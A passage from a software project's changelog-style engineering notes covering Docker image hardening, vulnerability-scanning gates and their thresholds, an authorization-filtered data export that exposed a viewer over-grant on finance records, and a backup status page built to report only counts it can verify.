   holding, and that a correctly-configured pipeline would deny it. The
   handle is now connected on first use through a Proxy, so no call site
   changed; the same error still fires on first use, and `/api/ready`
   reports it rather than the process dying on import, which is the better
   failure: a container that exits before it can answer its readiness
   endpoint tells an operator nothing.

2. **It did not listen where it claimed to.** Next's standalone
   `server.js` binds to `process.env.HOSTNAME`, and Docker sets that to
   the container id — so the server listened only on the address that id
   resolves to, not on `0.0.0.0` and not on loopback. Published ports
   still worked, which is exactly why this would have survived: fine from
   outside, unreachable from within, and its own healthcheck could never
   pass. Found by adding a healthcheck and watching it sit at `starting`
   forever.

3. **It shipped the working directory.** There was no `.dockerignore`, so
   `COPY . .` took `.env` — AUTH_SECRET, the database URL, CREDENTIAL_KEYS,
   the keys ADR-019 says must never live where a dump could reach them —
   into the build layer, and took the host's `node_modules` on top of the
   Linux ones installed in the deps stage. @node-rs/argon2 is a native
   binding, so an image built on a developer machine would have started
   cleanly and been unable to hash a password.

The image also ran as root, had no healthcheck, and carried npm and
corepack that the standalone bundle never uses. All three are fixed.

### The container gate, and what the threshold should be

The first scan reported **69 HIGH/CRITICAL**. Where they were matters more
than the number:

- **11 in the base image's bundled npm** — tar, pacote, sigstore,
  brace-expansion — none reachable by anything the container runs.
  Deleting npm and corepack from the runtime stage removed all of them.
  That is not gaming the scanner; it is the scanner correctly reporting
  code with no business being in a runtime image.
- **58 in Debian packages**, of which **2 had a fix**: a `libpcre2`
  arbitrary-code-execution pair patched in Debian's archive but not yet in
  the base tag. An `apt-get upgrade` in the runtime stage picks them up.
  It costs byte-for-byte reproducibility, which is the right trade: a
  build that reproduces exactly is worth less than one that is patched.

That leaves the gate's threshold, which is a judgement: **fail on HIGH and
above that have a fix available; report everything else**. There is nothing
to do about a vulnerability with no patch except change base image — a
decision to take deliberately, not one a red build should force at 2am —
and a gate that fires on things nobody can act on is a gate people learn
to pass by ignoring. The unfixed findings are printed by a second,
non-gating scan so the decision can be taken with the evidence in view.

The image now reports **zero fixable HIGH or CRITICAL findings**.

### A gate that has only ever passed is untested

Both gates were run against known-vulnerable inputs as well as clean ones,
and the dependency gate failed that check the first time — for the wrong
reason.

`npm_execpath` is not always a JavaScript file: pnpm 12 through corepack
points it at `pnpm-native.exe`, and `node pnpm-native.exe` dies with
ERR_UNKNOWN_FILE_EXTENSION. The crash exits non-zero, so the gate
"failed the build" on a vulnerable tree and looked like it was working.
Only reading the output of a run that was *supposed* to fail showed that
it had never reached the audit at all.

A check that cannot tell a real finding from its own crash is not a check.
Fixed by testing whether the exec path is a script before deciding how to
invoke it; the gate now names the actual advisory when it fails.

### Verified

`tsc --noEmit`, `eslint .`, 697 unit and integration tests, `next build`,
197 E2E tests, `pnpm scan` clean on both gates — and, for the first time,
`docker build` followed by running the container: `/api/health` and
`/api/ready` both answer, `/api/ready` reaches the database through the new
lazy handle, and `docker inspect` reports `healthy`.

### Not done

- **CI has still never executed on a runner.** This repository has no
  remote. The `scan` job is written to mirror `pnpm scan`, which *has*
  been run, so the commands in it are known-good even though the workflow
  is not.
- **Base image choice.** Distroless would remove most of the 56 unfixed
  Debian findings along with the shell. It would also change how the
  healthcheck and any future debugging work, which is a deliberate trade
  and belongs in its own ADR rather than in a scanning change.
- **Automated rebuilds.** `apt-get upgrade` only helps when the image is
  rebuilt. A household that builds once and runs for a year gets the
  patches as of that day, which is worth saying out loud in the operations
  notes.

## Export and backup status: the last two screens, and an over-grant they found

Screens 48 and 49 have been in `docs/design/screen-inventory.md` since
Phase 0 and were the last unbuilt views in it. **ADR-025** records the
decisions.

### An export is the place a policy mistake becomes total

Every other screen in this application leaks one record at a time, and
only to somebody who goes looking. An export is one click, one file, all
of it. An export that read rows directly would be the most complete
authorization bypass the application could contain, wearing the friendly
name "Export".

So `buildExport` passes every row through the same per-aggregate policy
function its own list page uses, and the bundle is *what this actor can
see* — never "the database". A child's export is small; that is correct
rather than broken, and the file says so in its own `scope` field, because
a file outlives the page that made it.

Three narrower rules come from the same principle: children of a record go
only when the parent goes (a warranty belongs to its asset and has no
visibility of its own); a link is exported only when both ends are (ADR-021's
rule, for ADR-021's reason); and the omitted columns are a deny-list rather
than an allow-list, because an allow-list would silently drop every future
column somebody forgot.

### The over-grant it found

`docs/permissions.md` has said "Finance | Viewer | none by default" since
Phase 0. `canAccess` applies a sensitivity ceiling to **CHILD only**, and a
VIEWER passes straight through on any read — so a viewer could see every
expense and claim in the household. A viewer is the carer, the relative,
the account somebody is given so they can see the calendar.

It had gone unnoticed because nothing made it visible: a viewer had to go
and look at the finance page. That is the pattern worth recording —
**an export is where a quiet over-grant stops being quiet**, because it
turns per-record access into one file containing all of it.

Fixed in `authorizeExpenseAccess` and `authorizeBudgetAccess`. An existing
integration test asserted the old behaviour ("lets a viewer read but not
write") and had to be changed: it encoded what the kernel happened to do
rather than what the matrix said. That is worth flagging as a behaviour
change, not just a fix — a household that gave someone a VIEWER account
expecting them to see finance will find they no longer can, which is what
the documented default has always specified.

### A backup page that refuses to show a tick

This application does not take the backups. A "Backups: healthy" badge for
a job it cannot observe would be the most dangerous thing on the page — a
reassurance with nothing behind it, believed precisely until the day it
mattered.

So the page reports only what it can know, and that turns out to be
exactly what the restore drill asks for: rows and newest timestamp per
table, schema version, size on disk, last export. Noted before a restore,
they turn "it seems to have worked" into a check. Alongside them is what
the household must back up, with the one mistake that looks entirely
correct until the dump is stolen given its own emphasis: `CREDENTIAL_KEYS`
must not live where the database backup lives, or the encryption protects
nothing against the attacker holding both.

Access is owner/admin, stricter than the "Household settings" row an adult
has read access to. Everything on the page is a read of the whole
household, and "there are 14 documents" told to somebody who can open
three is the aggregate form of the enumeration search and links both
prevent. `docs/permissions.md` now carries its own rows for Backup status
and Export.

### A catch that turned a bug into a confident wrong number

The first version of the backup page listed the tables to count as typed
strings. Two were wrong: the cases table is `household_case` — `case` is a
reserved word — and there is no `note` table at all. Both queries threw,
and a `catch` pushed `rows: 0`, so the page told a household with cases in
it that it had none.

On a page whose entire purpose is verifying a restore, that is worse than
no page. Two changes: the list is now the schema objects rather than their
names, so the names cannot be mistyped or go stale through a rename; and a
failed count reports **null**, rendered as "Not available", because "I
could not count this" and "there are none" must never look the same.

Found by a test asserting a count of 1, which is the only reason it was
found at all — the page looked entirely plausible.

### One more test that passed for a bad reason

The first E2E asserted the export page showed a "Cases" row. It passed,
because the case journey happens to run before the export journey. Run on
its own, it failed. Changed to assert the "People" row, which the setup
project guarantees: a test that depends on another spec file's leftovers
is one that fails the day somebody runs it alone.

### Verified

`tsc --noEmit`, `eslint .`, 711 unit and integration tests (14 new),
`next build`, and 215 E2E tests across desktop and mobile (11 new,
including downloading the real file, parsing it, and checking its
response headers), with axe checks on both new pages and both in the
horizontal-overflow list. Both pages were looked at on a phone.

### Not done

- **Import.** The bundle carries a `formatVersion` so a future importer
  can tell what it is reading, but nothing reads one back. Restoring from
  an export would need conflict rules — what happens when a record exists
  already — which is a design question, not an afternoon.
- **Encrypting the export.** It is deliberately plain, so it can be read
  without this application or any key. The page says so before the
  download rather than after.
- **A restore drill actually run.** The page now supplies the numbers the
  drill compares; the drill itself needs the household's own backup, which
  this repository does not have.
